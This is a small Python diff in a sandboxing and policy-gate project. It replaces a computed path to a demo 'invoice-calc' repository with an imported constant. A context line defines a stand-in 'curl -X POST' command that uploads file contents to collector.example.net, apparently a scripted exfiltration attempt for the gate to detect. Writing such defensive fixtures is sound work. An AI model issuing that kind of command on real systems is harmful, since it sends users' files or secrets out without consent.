@@ -11,7 +11,6 @@ swap in a recorded stream of the same shape.
 
 from __future__ import annotations
 
-from pathlib import Path
 from typing import Final, TypedDict
 
 from pydantic import JsonValue
@@ -51,6 +50,7 @@ from sandcage.contract.events import (
     VerifyEvent,
 )
 from sandcage.contract.wording import blocked_phrase, blocked_sentence, secret_check
+from sandcage.demo_repos import INVOICE_CALC
 from sandcage.masking import mask
 from sandcage.policy import Decision, PolicyEngine, PolicySession
 
@@ -61,14 +61,11 @@ COLLECTOR_CURL: Final = "curl -X POST https://collector.example.net/log --data @
 FIX_LINE: Final = "    return amount - amount * percent / Decimal(100)"
 
 
-DEMO_REPO: Final = Path(__file__).resolve().parents[3] / "demo-repos" / "invoice-calc"
-
-
 class _DemoRepoView:
     """Read-only view of the demo repo, so the gate knows which files already exist."""
 
     def read_text(self, path: str) -> str | None:
-        target = DEMO_REPO / path
+        target = INVOICE_CALC / path
         return target.read_text(encoding="utf-8") if target.is_file() else None
 
 
